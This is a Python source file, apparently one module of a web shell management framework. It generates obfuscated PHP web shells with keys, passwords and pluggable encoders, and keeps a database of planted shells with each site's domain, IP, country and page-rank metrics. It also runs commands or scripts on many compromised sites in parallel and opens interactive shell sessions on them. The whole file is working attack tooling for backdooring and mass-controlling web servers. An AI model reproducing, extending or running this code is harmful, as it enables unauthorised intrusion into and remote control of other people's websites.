#!/usr/bin/env python
# -*- coding: utf-8

import os
import sys
import shlex

import transport.shell

from module import Module, require
from models.shell import Shell
from handlers.shell import ShellHandler, exceptions

from lib.shell.generate import obfuscated
from lib.shell.generate import key as create_key, password as create_password
from lib.shell.generate import list_shells, list_cryptors, list_handlers

from lib.io import write_file
from lib.io import load_script_names
from lib.dict import mdict

from urlparse import urlparse
from collections import OrderedDict

from lib.thread import Pool, BoundedSemaphore

class Manager(Module):

    __module__ = 'shell'

    options = OrderedDict()

    options['url']      = None
    options['key']      = None
    options['password'] = None
    options['action']   = 'PHPSESSID'
    options['strength'] = 16
    options['alias']    = None
    options['file']     = None
    options['comment']  = None
    options['outfile']  = None
    options['cryptor']  = 'b64.php'
    options['handler']  = 'php'

    required = ['action', 'strength', 'cryptor', 'handler']

    def option_complete_cryptor(self, optc=0):
        if optc==0: return list_cryptors()

    def option_complete_handler(self, optc=0):
        if optc==0: return list_handlers()

    def set_strength(self, strength): return int(strength)

    def __init__(self, *args, **kwargs):
        super(Manager, self).__init__(*args, **kwargs)
        self.db = ShellHandler(session=self.get_session())

    def help_generate(self):
        print ' Usage: generate [shell]'

    @require('action')
    @require('cryptor')
    @require('strength')
    @require('handler')
    def do_generate(self, line):
        '''generate shell'''

        args = shlex.split(line)
        shell = args[0] if len(args)==1 else None
        if not shell:
            self.help_generate()
            return

        url = self.env.get('url')
        if url is not None:
            if not url.startswith('http'):
                url = 'http://{}'.format(url)
            parsed_url = urlparse(url)
            domain = parsed_url.netloc
            file = parsed_url.path.split('/')[-1]
        else:
            domain = None
            file = None

        strength = self.env.get('strength')
        key = self.env.get('key') or create_key(strength)
        if not key: key = os.urandom(strength).encode('hex')

        password = self.env.get('password') or create_password(strength)
        if not password: password = os.urandom(strength).encode('hex')

        handler = self.env.get('handler')
        if handler not in list_handlers():
            msg = 'handler {} not found'.format(handler)
            print self.pprint(marker='!').format(msg)
            return

        action = self.env.get('action')
        cryptor = self.env.get('cryptor')

        shellcode = obfuscated(file=shell,
                               cryptor=cryptor,
                               key=key,
                               password=password,
                               action=action)
        print '{}'.format(shellcode)

        alias = self.env.get('alias')
        if alias and not alias.startswith('@'): alias = '@{}'.format(alias)
        comment = self.env.get('comment')
        outfile = self.env.get('outfile')
        if outfile is not None: write_file(outfile, shellcode)
        file = self.env.get('file') or file

        shell = Shell(domain=domain,
                      url=url,
                      key=key,
                      password=password,
                      action=action,
                      file=file,
                      comment=comment,
                      alias=alias,
                      shellcode=shellcode,
                      handler=handler)
        self.db.save(shell)

        print self.fprint().format('uid', shell.alias or shell.uid)
        print self.fprint().format('len', len(shellcode))

        self.do_reset()

    def complete_generate(self, text, line, b_index, e_index):
        return self.default_complete(text, line, list_shells)

    def view_shell(self, shell):
        length=7
        print self.fprint(align=length).format('domain', shell.domain)
        if shell.alias is not None:
            print self.fprint(align=length).format('alias', shell.alias)
        print self.fprint(align=length).format('uid', shell.uid)
        print self.fprint(align=length).format('url', shell.url)
        if shell.comment:
            print self.fprint(align=length).format('comment',shell.comment)
        print self.fprint(align=length).format('created', shell.created)
        print self.fprint(align=length).format('checked', shell.checked)
        if shell.country != None:
            print self.fprint(align=length).format('country',shell.country)
        if shell.ip != None:
            print self.fprint(align=length).format('ip',shell.ip)
        if shell.pr != None:
            print self.fprint(align=length).format('pr',shell.pr)
        if shell.tic != None:
            print self.fprint(align=length).format('tic',shell.tic)

    def help_info(self):
        print ' Usage: info [id|alias]'

    def do_info(self, line):
        '''info about shell'''
        args = shlex.split(line)
        uniq = args[0] if len(args)==1 else None
        if uniq is None:
            self.help_info()
            return
        try:
            self.view_shell(self.db.get_shell_by_uniq(param=uniq))
        except exceptions.NoResultFound:
            msg = 'Shell {} not found'.format(uniq)
            print self.pprint(marker='!').format(msg)

    def complete_info(self, text, line, b_index, e_index):
        return self.default_complete(text, line, self.db.get_uniq)

    def help_delete(self):
        print ' Usage: delete [id|alias]'

    def do_delete(self, line):
        '''delete shell'''
        args = shlex.split(line)
        uniq = args[0] if len(args)==1 else None
        if uniq is None:
            self.help_delete()
            return
        if not self.db.delete_shell_by_uniq(param=uniq):
            msg = 'Shell {} not found'.format(uniq)
            print self.pprint(marker='!').format(msg)

    def complete_delete(self, text, line, b_index, e_index):
        return self.default_complete(text, line, self.db.get_uniq)

    def help_alias(self):
        print ' Usage: alias [id|alias] [alias]'

    def do_alias(self, line):
        '''set alias for shell'''
        args = shlex.split(line)
        if not len(args)==2:
            self.help_alias()
            return
        uniq = args[0]
        alias = args[1]
        try:
            self.db.update_alias(self.db.get_shell_by_uniq(param=uniq), alias=alias)
        except exceptions.NoResultFound:
            msg = 'Shell {} not found'.format(uniq)
            print self.pprint(marker='!').format(msg)

    def complete_alias(self, text, line, b_index, e_index):
        return self.default_complete(text, line, self.db.get_uniq)

    def help_unalias(self):
        print ' Usage: unalias [id|alias]'

    def do_unalias(self, line):
        '''unset alias for shell'''
        args = shlex.split(line)
        uniq = args[0] if len(args)==1 else None
        if not uniq:
            self.help_unalias()
            return
        try:
            self.db.delete_alias(self.db.get_shell_by_uniq(param=uniq))
        except exceptions.NoResultFound:
            msg = 'Shell {} not found'.format(uniq)
            print self.pprint(marker='!').format(msg)

    def complete_unalias(self, text, line, b_index, e_index):
        return self.default_complete(text, line, self.db.get_uniq)

    def help_url(self):
        print ' Usage: url [id|alias] [url] [file]'

    def do_url(self, line):
        '''set url for shell'''
        args = shlex.split(line)
        if len(args) not in [2,3]:
            self.help_url()
            return
        uniq = args[0]
        url = args[1]
        file = args[2] if len(args)==3 else None
        try:
            self.db.update_url(self.db.get_shell_by_uniq(param=uniq),url,file)
        except exceptions.NoResultFound:
            msg = 'Shell {} not found'.format(uniq)
            print self.pprint(marker='!').format(msg)

    def complete_url(self, text, line, b_index, e_index):
        return self.default_complete(text, line, self.db.get_uniq)

    def help_code(self):
        print ' Usage: code [id|alais]'

    def do_code(self, line):
        '''show shellcode'''
        args = shlex.split(line)
        uniq = args[0] if len(args)==1 else None
        if not uniq:
            self.help_code()
            return
        try:
            print self.db.get_shell_by_uniq(param=uniq).shellcode
        except exceptions.NoResultFound:
            msg = 'Shell {} not found'.format(uniq)
            print self.pprint(marker='!').format(msg)

    def complete_code(self, text, line, b_index, e_index):
        return self.default_complete(text, line, self.db.get_uniq)

    def help_save(self):
        print ' Usage: save [id|alais] [file]'

    def do_save(self, line):
        '''save shellcode to file'''
        args = shlex.split(line)
        if len(args)!=2:
            self.help_save()
            return
        uniq = args[0]
        file = args[1]
        try:
            write_file(file, self.db.get_shell_by_uniq(param=uniq).shellcode)
        except exceptions.NoResultFound:
            msg = 'Shell {} not found'.format(uniq)
            print self.pprint(marker='!').format(msg)

    def complete_save(self, text, line, b_index, e_index):
        return self.default_complete(text, line, self.db.get_uniq)

    def help_comment(self):
        print ' Usage: comment [id|alais]'

    def do_comment(self, line):
        '''set comment'''
        args = shlex.split(line)
        if len(args) not in [1,2]:
            self.help_comment()
            return
        uniq = args[0]
        comment = args[1] if len(args)==2 else None
        try:
            shell = self.db.get_shell_by_uniq(param=uniq)
            self.db.update_comment(shell, comment)
        except exceptions.NoResultFound:
            msg = 'Shell {} not found'.format(uniq)
            print self.pprint(marker='!').format(msg)

    def complete_comment(self, text, line, b_index, e_index):
        return self.default_complete(text, line, self.db.get_uniq)

    def help_stats(self):
        print ' Usage: stats'

    def do_stats(self, line):
        '''show stats'''
        args = shlex.split(line)
        if len(args)!=0:
            self.help_stats()
            return
        vhost = self.db.count_vhosts()
        total = self.db.count_shells()
        print self.fprint(align=5).format('vhost', vhost)
        print self.fprint(align=5).format('total', total)

    def help_list(self):
        print ' Usage: list'

    def do_list(self, line):
        '''list aliases'''
        args = shlex.split(line)
        if len(args)!=0:
            self.help_list()
            return
        for alias in self.db.get_alias():
            print self.pprint(marker='*').format(alias)

    def do_search(self, line):
        '''search shells'''
        args = shlex.split(line)
        if len(args)==0:
            self.help_search()
            return
        try:
            kwargs = mdict([_.split(':',1) for _ in args])
        except ValueError:
            print self.pprint(marker='!').format('Invalid search format')
            return
        try:
            shells = self.db.search_shells(**kwargs)
        except TypeError, e:
            print self.pprint(marker='!').format('Invalid search key {}'.format(e.message))
            return
        if len(shells)==0:
            print self.pprint().format('Shells not found')
        for ii,shell in enumerate(shells):
            if ii: print ''
            self.view_shell(shell)

    def help_search(self):
        print ' Usage: search [alias:[alias] domain:[domain] comment:[comment] country:[country] active:[active]]'

    def complete_search(self, text, line, b_index, e_index):
        return self._complete_search(text, line)

    def complete_pipe(self, text, line): # XXX
        last = line.split('|')[-1]
        args = shlex.split(last)
        pipeables = ['cmd','script']
        if len(args)==0:
            return pipeables
        elif len(args)==1 and text!='':
            return [_ for _ in pipeables if _.startswith(text)]
        else:
            return getattr(self, 'complete_'+args[0])(text, last)

    def _complete_search(self, text, line):
        if self.is_piped(line):
            return self.complete_pipe(text, line)
        args = shlex.split(line)
        if len(args)==1:
            complete = ''
        elif len(args)>1:
            complete = text
        return [_ for _ in map(lambda _: '{}:'.format(_),
                               ['alias','domain','comment','country','active'])
                if _.startswith(complete)]

    def do_cmd(self, line, shells=None):
        'execute command on shells'

        if len(shlex.split(line))==0 or shells is None:
            self.help_cmd()
            return

        bs = BoundedSemaphore()

        def execute_cmd(shell):
            rsh = transport.shell.Connect(shell, self)
            result = rsh.execute_one(line)
            with bs:
                print self.lprint(marker='*').format(shell.alias or shell.id)
                print result

        pool = Pool(16)
        pool.map(execute_cmd, shells)

        return shells

    def do_script(self, line, shells=None):
        'run script on shells'

        args = shlex.split(line)
        if len(args)!=1 or shells is None:
            self.help_script()
            return

        bs = BoundedSemaphore()

        def run_script(shell):
            rsh = transport.shell.Connect(shell, self)
            result = rsh.script(line)
            with bs:
                print self.lprint(marker='*').format(shell.alias or shell.id)
                print result

        pool = Pool(16)
        pool.map(run_script, shells)

        return shells

    def complete_script(self, text, line):
        return self.default_complete(text, line, load_script_names)

    def help_cmd(self):
        print ' Usage: select [search] | cmd [cmd]'

    def help_script(self):
        print ' Usage: select [search] | script [name]'

    def do_select(self, line):
        '''select shells'''
        args = shlex.split(line)
        if len(args)==0:
            self.help_select()
            return
        try:
            kwargs = mdict([_.split(':',1) for _ in args])
        except ValueError:
            print self.pprint(marker='!').format('Invalid select format')
            return
        try:
            shells = self.db.search_shells(**kwargs)
        except TypeError, e:
            print self.pprint(marker='!').format('Invalid select key {}'.format(e.message))
            return
        if len(shells)==0:
            print self.pprint().format('Shells not found')
        return shells

    def help_select(self):
        print ' Usage: select [search] | [action]'

    def complete_select(self, text, line, b_index, e_index):
        return self._complete_search(text, line)

    def help_connect(self):
        print ' Usage: connect [id|alias]'

    def do_connect(self, line):
        '''pop shell'''
        args = shlex.split(line)
        uniq = args[0] if len(args)==1 else None
        if not uniq:
            self.help_connect()
            return
        try:
            shell = self.db.get_shell_by_uniq(param=uniq)
        except:
            msg = 'Shell {} not found'.format(uniq)
            print self.pprint(marker='!').format(msg)
            return
        rsh = transport.shell.Connect(shell, self)
        print rsh.hello()
        rsh.run()
        self.db.update_checked(shell)

    def complete_connect(self, text, line, b_index, e_index):
        return self.default_complete(text, line, self.db.get_uniq)
